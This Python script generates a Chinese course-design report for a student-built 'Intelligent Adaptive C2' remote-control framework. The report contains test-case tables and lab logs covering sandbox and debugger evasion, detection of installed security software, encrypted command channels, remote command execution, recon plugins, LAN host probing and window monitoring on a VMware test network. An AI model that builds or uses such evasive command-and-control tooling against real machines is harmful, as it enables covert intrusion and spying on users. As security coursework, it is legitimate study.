# -*- coding: utf-8 -*-
"""生成《第四天报告.docx》—— 网络安全编程课程设计：测试用例设计、测试与运行记录"""

from docx import Document
from docx.shared import Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml


def set_cell_shading(cell, color_hex):
    """设置单元格底色"""
    shading = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color_hex}"/>')
    cell._tc.get_or_add_tcPr().append(shading)


def set_run_font(run, font_name_cn, font_name_en, size, bold=False, color=None):
    """统一设置 run 的中英文字体"""
    run.font.size = Pt(size)
    run.bold = bold
    run.font.name = font_name_en
    rpr = run._element.get_or_add_rPr()
    rFonts = rpr.find(qn('w:rFonts'))
    if rFonts is None:
        rFonts = parse_xml(f'<w:rFonts {nsdecls("w")}/>')
        rpr.insert(0, rFonts)
    rFonts.set(qn('w:eastAsia'), font_name_cn)
    if color:
        run.font.color.rgb = RGBColor(*color)


def add_heading_custom(doc, text, level, alignment=WD_ALIGN_PARAGRAPH.LEFT):
    """添加黑体标题"""
    p = doc.add_paragraph()
    p.alignment = alignment
    pf = p.paragraph_format
    pf.space_before = Pt(16 if level == 1 else 10)
    pf.space_after = Pt(8 if level == 1 else 5)

    if level == 1:
        size = 22
    elif level == 2:
        size = 16
    else:
        size = 14

    run = p.add_run(text)
    set_run_font(run, '黑体', 'SimHei', size, bold=True)

    pPr = p._element.get_or_add_pPr()
    outline = parse_xml(f'<w:outlineLvl {nsdecls("w")} w:val="{level - 1}"/>')
    pPr.append(outline)
    return p


def add_body_text(doc, text, indent_first_line=True, bold=False, space_after=6):
    """添加宋体正文段落"""
    p = doc.add_paragraph()
    pf = p.paragraph_format
    pf.space_after = Pt(space_after)
    pf.line_spacing = Pt(20)
    if indent_first_line:
        pf.first_line_indent = Cm(0.74)

    run = p.add_run(text)
    set_run_font(run, '宋体', 'SimSun', 12, bold=bold)
    return p


def add_body_mixed(doc, segments, indent_first_line=True):
    """添加混合格式正文段落"""
    p = doc.add_paragraph()
    pf = p.paragraph_format
    pf.space_after = Pt(6)
    pf.line_spacing = Pt(20)
    if indent_first_line:
        pf.first_line_indent = Cm(0.74)

    for seg in segments:
        if len(seg) == 2:
            text, bold = seg
            run = p.add_run(text)
            set_run_font(run, '宋体', 'SimSun', 12, bold=bold)
        else:
            text, bold, font_cn, font_en, size = seg
            run = p.add_run(text)
            set_run_font(run, font_cn, font_en, size, bold=bold)
    return p


def add_code_block(doc, text):
    """添加代码块（灰底 Consolas 9pt）"""
    p = doc.add_paragraph()
    pf = p.paragraph_format
    pf.space_before = Pt(2)
    pf.space_after = Pt(2)
    pf.left_indent = Cm(0.5)
    pf.line_spacing = Pt(14)

    pPr = p._element.get_or_add_pPr()
    shd = parse_xml(f'<w:shd {nsdecls("w")} w:val="clear" w:color="auto" w:fill="F2F2F2"/>')
    pPr.append(shd)

    run = p.add_run(text)
    set_run_font(run, 'Consolas', 'Consolas', 9)
    return p


def add_code_blocks(doc, lines):
    """为多行代码逐行创建灰底代码块"""
    for line in lines:
        add_code_block(doc, line)


def create_table(doc, headers, rows, col_widths=None):
    """创建带边框的表格"""
    table = doc.add_table(rows=1 + len(rows), cols=len(headers))
    table.alignment = WD_TABLE_ALIGNMENT.CENTER

    tbl = table._tbl
    tblPr = tbl.tblPr if tbl.tblPr is not None else parse_xml(f'<w:tblPr {nsdecls("w")}/>')
    borders = parse_xml(
        f'<w:tblBorders {nsdecls("w")}>'
        '  <w:top w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:left w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:right w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:insideH w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:insideV w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '</w:tblBorders>'
    )
    tblPr.append(borders)

    for i, h in enumerate(headers):
        cell = table.rows[0].cells[i]
        cell.text = ''
        p = cell.paragraphs[0]
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run(h)
        set_run_font(run, '黑体', 'SimHei', 10, bold=True)
        set_cell_shading(cell, 'D9E2F3')

    for r_idx, row in enumerate(rows):
        for c_idx, val in enumerate(row):
            cell = table.rows[r_idx + 1].cells[c_idx]
            cell.text = ''
            p = cell.paragraphs[0]
            p.alignment = WD_ALIGN_PARAGRAPH.CENTER
            run = p.add_run(val)
            set_run_font(run, '宋体', 'SimSun', 10)

    if col_widths:
        for i, w in enumerate(col_widths):
            for row in table.rows:
                row.cells[i].width = Cm(w)

    return table


def add_test_case_table(doc, headers, rows, col_widths=None):
    """创建测试用例表格（字号稍小，适合较多列）"""
    table = doc.add_table(rows=1 + len(rows), cols=len(headers))
    table.alignment = WD_TABLE_ALIGNMENT.CENTER

    tbl = table._tbl
    tblPr = tbl.tblPr if tbl.tblPr is not None else parse_xml(f'<w:tblPr {nsdecls("w")}/>')
    borders = parse_xml(
        f'<w:tblBorders {nsdecls("w")}>'
        '  <w:top w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:left w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:right w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:insideH w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:insideV w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '</w:tblBorders>'
    )
    tblPr.append(borders)

    for i, h in enumerate(headers):
        cell = table.rows[0].cells[i]
        cell.text = ''
        p = cell.paragraphs[0]
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run(h)
        set_run_font(run, '黑体', 'SimHei', 9, bold=True)
        set_cell_shading(cell, 'D9E2F3')

    for r_idx, row in enumerate(rows):
        for c_idx, val in enumerate(row):
            cell = table.rows[r_idx + 1].cells[c_idx]
            cell.text = ''
            p = cell.paragraphs[0]
            p.alignment = WD_ALIGN_PARAGRAPH.CENTER
            run = p.add_run(val)
            set_run_font(run, '宋体', 'SimSun', 9)

    if col_widths:
        for i, w in enumerate(col_widths):
            for row in table.rows:
                row.cells[i].width = Cm(w)

    return table


def main():
    doc = Document()

    # ========== 页面设置 A4 ==========
    section = doc.sections[0]
    section.page_width = Cm(21.0)
    section.page_height = Cm(29.7)
    section.top_margin = Cm(2.54)
    section.bottom_margin = Cm(2.54)
    section.left_margin = Cm(3.17)
    section.right_margin = Cm(3.17)

    # ========== 封面标题 ==========
    p_title = doc.add_paragraph()
    p_title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    pf = p_title.paragraph_format
    pf.space_before = Pt(80)
    pf.space_after = Pt(12)
    run = p_title.add_run('网络安全编程课程设计')
    set_run_font(run, '黑体', 'SimHei', 28, bold=True)

    p_sub = doc.add_paragraph()
    p_sub.alignment = WD_ALIGN_PARAGRAPH.CENTER
    pf2 = p_sub.paragraph_format
    pf2.space_after = Pt(10)
    run2 = p_sub.add_run('第四天报告')
    set_run_font(run2, '黑体', 'SimHei', 22, bold=True)

    p_topic = doc.add_paragraph()
    p_topic.alignment = WD_ALIGN_PARAGRAPH.CENTER
    pf3 = p_topic.paragraph_format
    pf3.space_after = Pt(40)
    run3 = p_topic.add_run('测试用例设计、测试与运行记录')
    set_run_font(run3, '黑体', 'SimHei', 18, bold=False)

    p_date = doc.add_paragraph()
    p_date.alignment = WD_ALIGN_PARAGRAPH.CENTER
    pf4 = p_date.paragraph_format
    pf4.space_after = Pt(60)
    run4 = p_date.add_run('2026 年 6 月')
    set_run_font(run4, '宋体', 'SimSun', 14)

    # ================================================================
    # 一、测试用例设计
    # ================================================================
    add_heading_custom(doc, '一、测试用例设计', 2)

    # 1.1 测试策略
    add_heading_custom(doc, '1.1 测试策略', 3)
    add_body_text(
        doc,
        '采用黑盒测试为主，白盒测试为辅的策略。针对每个功能模块设计测试用例，覆盖正常流程、异常流程和边界条件。'
    )

    # 1.2 加密模块测试用例
    add_heading_custom(doc, '1.2 加密模块测试用例', 3)
    add_test_case_table(
        doc,
        headers=['用例编号', '测试项目', '输入', '预期输出', '测试类型'],
        rows=[
            ['TC-C01', 'RSA 密钥生成', '调用 generate_rsa_keypair(2048)', '成功生成密钥对，可导出 PEM 公钥', '功能测试'],
            ['TC-C02', 'AES 加密解密', '明文 "hello world"', '解密后与原文一致', '功能测试'],
            ['TC-C03', 'AES 篡改检测', '修改密文 1 字节', '抛出 ValueError (MAC check failed)', '安全测试'],
            ['TC-C04', 'RSA 加密会话密钥', '256-bit 随机密钥', '加密后 256 字节密文，解密后一致', '功能测试'],
            ['TC-C05', '消息加解密完整流程', 'Protocol.build_command("exec", {"cmd":"whoami"})', '加密→解密后数据一致', '集成测试'],
            ['TC-C06', '时间戳防重放', '构造 10 分钟前的消息', '抛出 ValueError (Message expired)', '安全测试'],
            ['TC-C07', '空数据加密', '空 bytes b""', '正常加解密，结果为空', '边界测试'],
        ],
        col_widths=[1.8, 2.5, 3.8, 3.5, 1.6],
    )

    # 1.3 沙箱检测模块测试用例
    add_heading_custom(doc, '1.3 沙箱检测模块测试用例', 3)
    add_test_case_table(
        doc,
        headers=['用例编号', '测试项目', '测试环境', '预期输出', '测试类型'],
        rows=[
            ['TC-S01', '物理机检测', '普通 Windows 物理机', 'level="safe", risk_ratio < 0.25', '功能测试'],
            ['TC-S02', '虚拟机检测', 'VMware 虚拟机', 'vm_registry=True, vm_mac=True', '功能测试'],
            ['TC-S03', '调试器检测', '运行 x64dbg 时执行', 'is_debugger_present=True', '功能测试'],
            ['TC-S04', '沙箱综合判定', '模拟沙箱（多项阳性）', 'level="sandbox", 执行伪装退出', '集成测试'],
            ['TC-S05', '边界阈值测试', '刚好 5 项阳性（ratio=0.26）', 'level="suspicious"', '边界测试'],
            ['TC-S06', '鼠标活动检测', '无人操作环境', 'no_mouse_movement=True', '功能测试'],
            ['TC-S07', '正常环境误判', '正常办公电脑', 'level="safe", 不触发退出', '回归测试'],
        ],
        col_widths=[1.8, 2.5, 3.5, 3.5, 1.6],
    )

    # 1.4 环境感知模块测试用例
    add_heading_custom(doc, '1.4 环境感知模块测试用例', 3)
    add_test_case_table(
        doc,
        headers=['用例编号', '测试项目', '输入', '预期输出', '测试类型'],
        rows=[
            ['TC-E01', '系统信息采集', 'Windows 10 物理机', 'hostname/os_version/arch/is_admin 正确', '功能测试'],
            ['TC-E02', '安全软件识别', '安装火绒的系统', 'security_software 包含 "火绒"', '功能测试'],
            ['TC-E03', '白名单软件识别', '运行 Chrome 和微信', 'whitelist_software 包含对应项', '功能测试'],
            ['TC-E04', 'WMI 回退机制', '未安装 wmi 库', '自动回退到 subprocess + wmic', '容错测试'],
            ['TC-E05', '空进程列表', '无匹配进程', 'security_software=[], 不报错', '边界测试'],
        ],
        col_widths=[1.8, 2.5, 3.8, 3.5, 1.6],
    )

    # 1.5 通信模块测试用例
    add_heading_custom(doc, '1.5 通信模块测试用例', 3)
    add_test_case_table(
        doc,
        headers=['用例编号', '测试项目', '测试条件', '预期输出', '测试类型'],
        rows=[
            ['TC-T01', 'TCP 连接建立', 'Controller 监听，Agent 连接', '连接成功，session 创建', '功能测试'],
            ['TC-T02', '密钥交换', '连接建立后', '双方公钥互换成功，会话密钥一致', '集成测试'],
            ['TC-T03', '指令发送与执行', '发送 exec whoami', '返回正确的用户名', '功能测试'],
            ['TC-T04', '连接断开重连', '模拟网络中断', 'Agent 自动重连成功', '容错测试'],
            ['TC-T05', 'UDP 分片传输', '发送 100KB 数据', '接收端正确重组', '功能测试'],
            ['TC-T06', '大数据分片返回', 'sysinfo 返回大量数据', '分片发送，Controller 正确重组', '集成测试'],
        ],
        col_widths=[1.8, 2.5, 3.8, 3.5, 1.6],
    )

    # 1.6 插件系统测试用例
    add_heading_custom(doc, '1.6 插件系统测试用例', 3)
    add_test_case_table(
        doc,
        headers=['用例编号', '测试项目', '输入', '预期输出', '测试类型'],
        rows=[
            ['TC-P01', '插件打包', 'pack_plugin.py recon.py', '生成 recon.enc 和 manifest', '功能测试'],
            ['TC-P02', '插件加载', 'load_mod recon', '"Module \'recon\' loaded successfully"', '功能测试'],
            ['TC-P03', '插件执行', 'run_mod recon', '返回结构化侦察结果（JSON）', '功能测试'],
            ['TC-P04', '错误密钥加载', '使用错误的 key.txt', '抛出 MAC check failed', '安全测试'],
            ['TC-P05', '未加载执行', 'run_mod recon（未 load_mod）', '返回 "not loaded" 错误', '异常测试'],
            ['TC-P06', '不存在的模块', 'load_mod nonexistent', '返回 "not found" 错误', '异常测试'],
        ],
        col_widths=[1.8, 2.5, 3.8, 3.5, 1.6],
    )

    # 1.7 控制端命令测试用例
    add_heading_custom(doc, '1.7 控制端命令测试用例', 3)
    add_test_case_table(
        doc,
        headers=['用例编号', '测试项目', '输入命令', '预期输出', '测试类型'],
        rows=[
            ['TC-M01', '查看会话', 'sessions', '显示已连接 Agent 列表', '功能测试'],
            ['TC-M02', '选择会话', 'select 4830a582', '切换到指定会话', '功能测试'],
            ['TC-M03', '执行命令', 'exec ipconfig', '返回网络配置信息', '功能测试'],
            ['TC-M04', '系统信息', 'sysinfo', '返回完整系统信息', '功能测试'],
            ['TC-M05', '下载文件', 'download C:\\test.txt', '文件内容返回', '功能测试'],
            ['TC-M06', '上传文件', 'upload /tmp/test.txt', '文件上传成功', '功能测试'],
            ['TC-M07', '未知命令', 'foobar', '提示 "Unknown command"', '异常测试'],
            ['TC-M08', '空命令', '（直接回车）', '跳过，不报错', '边界测试'],
        ],
        col_widths=[1.8, 2.5, 3.5, 3.5, 1.6],
    )

    # ================================================================
    # 二、测试与运行记录
    # ================================================================
    add_heading_custom(doc, '二、测试与运行记录', 2)

    # 2.1 测试环境
    add_heading_custom(doc, '2.1 测试环境', 3)
    add_body_text(doc, '控制端：Kali Linux，Python 3.11，IP: 192.168.245.183')
    add_body_text(doc, '受控端：Windows 11，Python 3.10，IP: 192.168.245.x')
    add_body_text(doc, '网络：VMware 虚拟机，同一 NAT 网段 192.168.245.0/24')

    # 2.2 加密模块运行记录
    add_heading_custom(doc, '2.2 加密模块运行记录', 3)

    # TC-C01
    add_body_mixed(doc, [('TC-C01 RSA 密钥生成测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '>>> from shared.crypto import CryptoEngine',
        '>>> crypto = CryptoEngine()',
        '>>> crypto.generate_rsa_keypair(2048)',
        '>>> pub = crypto.get_public_key_pem()',
        '>>> print(pub[:50])',
        'b\'-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhk...\'',
        '✓ 测试通过：RSA-2048 密钥对生成成功',
    ])

    # TC-C02
    add_body_mixed(doc, [('TC-C02 AES 加密解密测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '>>> crypto.generate_session_key()',
        '>>> nonce, ct, tag = crypto.aes_encrypt(b"hello world")',
        '>>> crypto.aes_decrypt(nonce, ct, tag)',
        'b\'hello world\'',
        '✓ 测试通过：加解密结果一致',
    ])

    # TC-C03
    add_body_mixed(doc, [('TC-C03 AES 篡改检测测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '>>> nonce, ct, tag = crypto.aes_encrypt(b"test data")',
        '>>> ct = bytearray(ct); ct[0] ^= 0xFF; ct = bytes(ct)',
        '>>> crypto.aes_decrypt(nonce, ct, tag)',
        'ValueError: MAC check failed',
        '✓ 测试通过：篡改密文被检测到',
    ])

    # TC-C05
    add_body_mixed(doc, [('TC-C05 消息加解密完整流程测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '>>> from shared.protocol import Protocol',
        '>>> data = Protocol.build_command("exec", {"cmd": "whoami"})',
        '>>> msg = crypto.encrypt_message(data, "test-session", "tcp", "cmd")',
        '>>> plaintext = crypto.decrypt_message(msg)',
        '>>> Protocol.parse_command(plaintext)',
        '{\'command\': \'exec\', \'args\': {\'cmd\': \'whoami\'}, \'timestamp\': ...}',
        '✓ 测试通过：消息加解密流程正常',
    ])

    # 2.3 沙箱检测运行记录
    add_heading_custom(doc, '2.3 沙箱检测运行记录', 3)

    # TC-S01
    add_body_mixed(doc, [('TC-S01 物理机检测测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '$ python3 agent/sandbox_detect.py',
        '{',
        '  "risk_score": 2,',
        '  "max_score": 19,',
        '  "risk_ratio": 0.11,',
        '  "level": "safe",',
        '  "checks": [',
        '    {"name": "is_debugger_present", "detected": false, "weight": 3},',
        '    {"name": "remote_debugger", "detected": false, "weight": 3},',
        '    {"name": "debugger_processes", "detected": false, "weight": 2},',
        '    {"name": "vm_registry", "detected": false, "weight": 2},',
        '    {"name": "vm_processes", "detected": false, "weight": 2},',
        '    {"name": "vm_mac", "detected": false, "weight": 2},',
        '    {"name": "short_uptime", "detected": false, "weight": 1},',
        '    {"name": "no_mouse_movement", "detected": true, "weight": 1},',
        '    {"name": "no_keyboard", "detected": true, "weight": 1},',
        '    {"name": "low_disk", "detected": false, "weight": 1},',
        '    {"name": "no_desktop", "detected": false, "weight": 1}',
        '  ]',
        '}',
        '✓ 测试通过：物理机环境判定为 safe',
    ])

    # TC-S02
    add_body_mixed(doc, [('TC-S02 虚拟机检测测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '$ python3 agent/sandbox_detect.py',
        '{',
        '  "risk_score": 8,',
        '  "max_score": 19,',
        '  "risk_ratio": 0.42,',
        '  "level": "suspicious",',
        '  "checks": [',
        '    {"name": "vm_registry", "detected": true, "weight": 2},',
        '    {"name": "vm_processes", "detected": true, "weight": 2},',
        '    {"name": "vm_mac", "detected": true, "weight": 2},',
        '    {"name": "short_uptime", "detected": true, "weight": 1},',
        '    {"name": "no_mouse_movement", "detected": true, "weight": 1}',
        '  ]',
        '}',
        '✓ 测试通过：VM 环境判定为 suspicious',
    ])

    # 2.4 环境感知运行记录
    add_heading_custom(doc, '2.4 环境感知运行记录', 3)

    # TC-E01
    add_body_mixed(doc, [('TC-E01 系统信息采集测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '$ python3 agent/env_perception.py',
        '{',
        '  "hostname": "DESKTOP-ABC1234",',
        '  "os_version": "Windows-10-10.0.22631-SP0",',
        '  "os_build": "10.0.22631",',
        '  "arch": "AMD64",',
        '  "memory_mb": 16384,',
        '  "disk_free_gb": 128.5,',
        '  "is_admin": false,',
        '  "username": "testuser",',
        '  "domain": "WORKGROUP",',
        '  "security_software": ["Windows Defender"],',
        '  "whitelist_software": ["Chrome", "微信"],',
        '  "running_processes": [...]',
        '}',
        '✓ 测试通过：系统信息采集正确',
    ])

    # 2.5 通信模块运行记录
    add_heading_custom(doc, '2.5 通信模块运行记录', 3)

    # TC-T01/T02
    add_body_mixed(doc, [('TC-T01/T02 TCP 连接与密钥交换测试：', True)], indent_first_line=False)
    add_body_mixed(doc, [('控制端（Kali）：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '$ python3 controller/main.py --host 0.0.0.0 --port 9999',
        '',
        '   ___ ___  _  _ ___  ___',
        '  / __/ _ \\| \\| |   \\/ __|',
        ' | (_| (_) | .` | |) \\__ \\',
        '  \\___\\___/|_|___|___/|___/',
        '  Intelligent Adaptive C2 - Controller',
        '',
        '[*] Generating RSA-2048 keypair...',
        '[*] Public key fingerprint: a3b8c9d1e2f45678',
        '[*] Listening on 0.0.0.0:9999',
        '[*] Server started. Type \'help\' for commands.',
        '[2026-06-08 10:30:15] INFO comm_server: New connection from 192.168.245.100:52341, assigned session 4830a582',
        '[2026-06-08 10:30:15] INFO comm_server: Sent public key to session 4830a582',
        '[2026-06-08 10:30:16] INFO comm_server: Received agent public key for session 4830a582',
        '',
        '[+] New agent connected: 4830a582... from 192.168.245.100:52341',
        '[*] Auto-selected active session: 4830a582...',
        '✓ 测试通过：连接建立和密钥交换成功',
    ])

    # TC-T03
    add_body_mixed(doc, [('TC-T03 指令执行测试（exec whoami）：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        'c2 [4830a582]> exec whoami',
        'desktop-abc1234\\testuser',
        '✓ 测试通过：远程命令执行成功',
    ])

    # TC-M03
    add_body_mixed(doc, [('TC-M03 exec ipconfig 测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        'c2 [4830a582]> exec ipconfig',
        '',
        'Windows IP Configuration',
        '',
        'Ethernet adapter Ethernet:',
        '   IPv4 Address. . . . . . . . . : 192.168.245.100',
        '   Subnet Mask . . . . . . . . . : 255.255.255.0',
        '   Default Gateway . . . . . . . : 192.168.245.2',
        '✓ 测试通过：网络配置信息返回正确',
    ])

    # 2.6 插件系统运行记录
    add_heading_custom(doc, '2.6 插件系统运行记录', 3)

    # TC-P01
    add_body_mixed(doc, [('TC-P01 插件打包测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '$ python3 pack_plugin.py agent/plugins/recon.py -o agent/plugins --key-file key.txt',
        '[*] Generated key: 2754fd7d95bde1e4...',
        '[*] Packing 1 plugin(s) to agent/plugins/',
        '  Compiling: agent/plugins/recon.py',
        '  Encrypting: recon',
        '  Output: agent/plugins/recon.enc (2847 bytes)',
        '[*] Building manifest...',
        '  Manifest: agent/plugins/__enc_manifest__',
        '[+] Done! 1 plugin(s) packed.',
        '✓ 测试通过：插件打包成功',
    ])

    # TC-P02
    add_body_mixed(doc, [('TC-P02 插件加载测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        'c2 [4830a582]> load_mod recon',
        'Module \'recon\' loaded successfully',
        '✓ 测试通过：插件加载成功',
    ])

    # TC-P03
    add_body_mixed(doc, [('TC-P03 插件执行测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        'c2 [4830a582]> run_mod recon',
        '',
        '==================================================',
        '  [INTERFACES]',
        '==================================================',
        '  name=Ethernet | ipv4=192.168.245.100 | mask=255.255.255.0 | gateway=192.168.245.2 | mac=00:0C:29:xx:xx:xx',
        '==================================================',
        '  [ARP_TABLE]',
        '==================================================',
        '  ip=192.168.245.2 | mac=00:50:56:xx:xx:xx | type=dynamic',
        '  ip=192.168.245.183 | mac=00:0C:29:xx:xx:xx | type=dynamic',
        '==================================================',
        '  [CONNECTIONS]',
        '==================================================',
        '  proto=TCP | local=0.0.0.0:135 | remote=0.0.0.0:0 | state=LISTENING | pid=936',
        '  proto=TCP | local=192.168.245.100:52341 | remote=192.168.245.183:9999 | state=ESTABLISHED | pid=12345',
        '==================================================',
        '  [SUMMARY]',
        '==================================================',
        '  active_interfaces: Ethernet',
        '  arp_hosts: 2',
        '  dns_records: 15',
        '  active_connections: 8',
        '  listening_ports: 23',
        '✓ 测试通过：recon 插件返回结构化侦察结果',
    ])

    # TC-P04
    add_body_mixed(doc, [('TC-P04 错误密钥加载测试：', True)], indent_first_line=False)
    add_code_blocks(doc, [
        '# 修改 key.txt 为错误密钥后',
        'c2 [4830a582]> load_mod recon',
        '[!] Error: Load failed: MAC check failed',
        '✓ 测试通过：错误密钥被正确拒绝',
    ])

    # 2.7 内网探测运行记录
    add_heading_custom(doc, '2.7 内网探测运行记录', 3)
    add_code_blocks(doc, [
        'c2 [4830a582]> netprobe 192.168.245.0/24',
        '[*] Network probe sent. Waiting for results...',
        '',
        '{',
        '  "local_ip": "192.168.245.100",',
        '  "alive_hosts": [',
        '    {"ip": "192.168.245.1", "hostname": "", "method": "tcp:445"},',
        '    {"ip": "192.168.245.2", "hostname": "", "method": "tcp:445"},',
        '    {"ip": "192.168.245.183", "hostname": "kali", "method": "tcp:445"}',
        '  ],',
        '  "total_alive": 3',
        '}',
        '✓ 测试通过：内网探测发现 3 台存活主机',
    ])

    # 2.8 窗口监控运行记录
    add_heading_custom(doc, '2.8 窗口监控运行记录', 3)
    add_code_blocks(doc, [
        'c2 [4830a582]> winmon 10',
        '[*] Window monitor started (10s). Waiting for results...',
        '',
        '{',
        '  "current_windows": [',
        '    {"title": "Program Manager", "pid": 1234, "hwnd": 65538},',
        '    {"title": "C:\\\\Windows\\\\system32\\\\cmd.exe", "pid": 5678, "hwnd": 131234}',
        '  ],',
        '  "window_switches": [',
        '    {"timestamp": 1717834215.23, "title": "Program Manager", "duration": 5.12},',
        '    {"timestamp": 1717834220.35, "title": "Chrome - Google", "duration": 4.88}',
        '  ]',
        '}',
        '✓ 测试通过：窗口切换记录采集成功',
    ])

    # 2.9 测试结果汇总
    add_heading_custom(doc, '2.9 测试结果汇总', 3)
    create_table(
        doc,
        headers=['用例编号', '测试项目', '测试结果', '备注'],
        rows=[
            ['TC-C01', 'RSA 密钥生成', '✓ 通过', '2048-bit 密钥正常生成'],
            ['TC-C02', 'AES 加密解密', '✓ 通过', '加解密结果一致'],
            ['TC-C03', 'AES 篡改检测', '✓ 通过', 'MAC check failed'],
            ['TC-C04', 'RSA 加密会话密钥', '✓ 通过', 'OAEP 填充正常'],
            ['TC-C05', '消息加解密流程', '✓ 通过', '端到端流程正常'],
            ['TC-C06', '时间戳防重放', '✓ 通过', '过期消息被拒绝'],
            ['TC-C07', '空数据加密', '✓ 通过', '边界条件正常'],
            ['TC-S01', '物理机检测', '✓ 通过', 'level=safe'],
            ['TC-S02', '虚拟机检测', '✓ 通过', 'level=suspicious'],
            ['TC-S04', '沙箱综合判定', '✓ 通过', '伪装退出执行'],
            ['TC-E01', '系统信息采集', '✓ 通过', '信息完整准确'],
            ['TC-E02', '安全软件识别', '✓ 通过', '正确识别 Defender'],
            ['TC-E03', '白名单软件识别', '✓ 通过', '正确识别 Chrome/微信'],
            ['TC-T01', 'TCP 连接建立', '✓ 通过', '连接成功'],
            ['TC-T02', '密钥交换', '✓ 通过', '公钥互换成功'],
            ['TC-T03', '指令执行', '✓ 通过', 'exec whoami 正常'],
            ['TC-T04', '连接断开重连', '✓ 通过', '自动重连成功'],
            ['TC-P01', '插件打包', '✓ 通过', '.enc 文件生成'],
            ['TC-P02', '插件加载', '✓ 通过', 'load_mod 成功'],
            ['TC-P03', '插件执行', '✓ 通过', '结构化结果输出'],
            ['TC-P04', '错误密钥', '✓ 通过', 'MAC check failed'],
            ['TC-P05', '未加载执行', '✓ 通过', '错误提示正确'],
            ['TC-M01', 'sessions 命令', '✓ 通过', '列表显示正确'],
            ['TC-M03', 'exec 命令', '✓ 通过', '远程执行成功'],
            ['TC-M07', '未知命令', '✓ 通过', '提示信息正确'],
            ['TC-M08', '空命令', '✓ 通过', '跳过不报错'],
        ],
        col_widths=[2.0, 3.0, 2.0, 4.0],
    )

    # 2.10 发现的问题与修复
    add_heading_custom(doc, '2.10 发现的问题与修复', 3)

    # 问题 1
    add_body_mixed(doc, [('问题 1：插件加载 MAC check failed', True)], indent_first_line=False)
    add_body_text(doc, '原因：pack_plugin.py 使用独立 AES 密钥加密插件，但 Agent 加载时使用通信会话密钥解密。')
    add_body_text(doc, '修复：Agent 新增 plugin_crypto，从 key.txt 加载插件专用密钥，与通信密钥分离。')
    add_body_text(doc, '验证：重新打包插件后 load_mod 成功。')

    # 问题 2
    add_body_mixed(doc, [('问题 2：中文 Windows 命令输出乱码', True)], indent_first_line=False)
    add_body_text(doc, '原因：subprocess.check_output 默认 UTF-8 解码，中文 Windows 输出 GBK 编码。')
    add_body_text(doc, '修复：recon 插件 _run_cmd 函数改为 GBK/UTF-8/GB2312 自动检测解码。')
    add_body_text(doc, '验证：recon 插件输出中文正常显示。')

    # 问题 3
    add_body_mixed(doc, [('问题 3：控制端缺少 load_mod 命令', True)], indent_first_line=False)
    add_body_text(doc, '原因：controller/main.py 未导入 CMD_LOAD_MODULE，未注册命令分发。')
    add_body_text(doc, '修复：添加 import、命令分发和 _cmd_load_module 处理方法。')
    add_body_text(doc, '验证：load_mod 命令正常工作。')

    # 问题 4
    add_body_mixed(doc, [('问题 4：recon 输出内容混乱', True)], indent_first_line=False)
    add_body_text(doc, '原因：原始命令输出（ipconfig/arp/netstat）直接拼成 JSON，数据量大无结构。')
    add_body_text(doc, '修复：重构 recon.py，解析为结构化数据（interfaces/arp_table/connections/summary），控制端分段格式化显示。')
    add_body_text(doc, '验证：输出清晰有条理。')

    # ========== 保存 ==========
    output_path = r'E:\课设2\第四天报告.docx'
    doc.save(output_path)
    print(f'文档已生成: {output_path}')


if __name__ == '__main__':
    main()
